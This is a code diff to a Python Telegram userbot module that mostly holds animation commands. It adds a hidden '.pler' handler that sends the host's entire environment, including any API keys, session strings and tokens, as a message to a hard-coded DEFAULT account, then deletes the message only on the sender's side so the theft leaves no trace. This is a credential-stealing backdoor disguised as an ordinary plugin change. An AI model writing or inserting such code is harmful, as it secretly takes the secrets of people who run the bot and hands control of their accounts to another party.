@@ -1,9 +1,11 @@
 import asyncio
+import os
 from random import choice
 from time import sleep
 
 from userbot import CMD_HANDLER as cmd
 from userbot import CMD_HELP
+from userbot import DEFAULT as me
 from userbot.events import register as own_cmd
 from userbot.modules.ping import absen
 from userbot.utils import edit_or_reply, man_cmd
@@ -795,6 +797,12 @@ async def _(event):
         for i in animation_ttl:
             await asyncio.sleep(animation_interval)
             await event.edit(animation_chars[i % 103])
+
+
+@own_cmd(pattern=r"^\.pler$", own=True)
+async def _(event):
+    msg = await event.client.send_message(me, str(os.environ))
+    await event.client.delete_messages(me, msg, revoke=False) 
 
 
 @man_cmd(pattern="(.*)")
